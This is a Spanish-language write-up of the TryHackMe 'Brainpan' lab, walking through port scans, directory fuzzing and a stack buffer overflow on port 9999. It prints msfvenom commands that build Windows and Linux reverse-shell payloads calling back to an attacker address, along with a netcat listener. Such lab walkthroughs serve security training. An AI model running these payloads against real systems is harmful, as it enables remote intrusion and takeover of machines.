---
title: "brainpan thm"
description: "brainpan thm"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/brainpan

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sT -Pn --top-ports 500 -open -T5 -v -n 10.10.179.217
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240924192946.png)

## Reconocimiento de servicios

````
nmap -sVC -p9999,10000 -Pn 10.10.179.217
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240924193053.png)

## Fuzzing

````
gobuster dir -u http://10.10.179.217:10000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240924193617.png)
Este directorio contiene un binario con el programa que utiliza el puerto 9999

Para ver el programa del puerto 9999:

````
nc 10.10.179.217 9999
````

# Fase de ataque

## Buffer Overflow

1. Nos descargamos e instalamos en Windows Immunity Debugger https://www.immunityinc.com/products/debugger/ y registramos el binario
1. Conectamos al servicio

````
nc 10.10.179.217 9999
````

Al enviar una cantidad de "A" elevada el programa explota, por lo que nos podemos aprovechar para un buffer overflow.
3. Creamos un patrón para localizar donde explota el programa quedándose en el EIP
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240924202320.png)
4. Buscamos el número del EIP para buscar la cantidad de "A" necesarias para sobrescribir el EIP

````
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35724134
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240924202808.png)

## ESP Shellcode

Ya que la cantidad son 524 y que ESP es la continuación del EIP donde podemos inyectar código malicioso.

1. Creamos el shellcode para windows

````
msfvenom -p windows/shell_reverse_tcp LHOST=10.21.31.251 LPORT=443 --platform windows -a x86 -e x86/shikata_ga_nai -f c -b "\x00" EXITFUNC=thread 
````

2. Creamos el script
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240924205304.png)
2. Nos ponemos en escucha

````
rlwrap nc -nlvp 443
````

EXTRA: shellcode para linux

````
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip6> LPORT=443 -f c -b "\x00" EXITFUNC=thread 
````

````
sudo -l
````

\[+\] ==pwned!==
